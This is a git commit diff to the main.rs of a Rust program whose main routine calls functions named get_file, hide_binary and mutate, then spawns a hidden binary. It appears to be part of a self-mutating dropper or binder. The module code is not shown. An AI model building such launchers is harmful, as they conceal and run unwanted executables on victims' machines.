bd815b885295b9ec394f3b3868bfc48df42f966c
Severus Snape <144463175+0x00snape@users.noreply.github.com>
2025-03-25 01:09:30 +0545

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -1,30 +1,19 @@
 mod modules;
+use modules::{get_file, mutate, hide_binary};
 
 fn main() {
-
-    let exe = std::env::current_exe().expect("Failed to get the path")
-                            .display().to_string()
-                            .split("/")
-                            .last().expect("Failed to slice the path")
-                            .to_string();
     
-    let binary_path = modules::get_path();
-    if binary_path.is_empty() {
-       
-        modules::mutate();
+    let (exe, binary) = get_file();
+    if binary.is_empty() {
+        mutate();
         std::process::exit(0);
+    }       
         
-    } else if std::path::Path::new(&format!(".{}", exe)).exists() {
-         
-        std::process::Command::new(format!("./{}", binary_path)).spawn().expect("Failed to spawn the process");
-        modules::mutate();
-    
-    } else {
-        
-        modules::hide_binary(binary_path, exe); 
-        modules::mutate();
-
-    }
+    hide_binary(&exe, &binary); 
+    mutate();
+    std::process::Command::new(format!("./{}", binary))
+                        .spawn()
+                        .expect("Failed to spawn the process");
 
 }
 
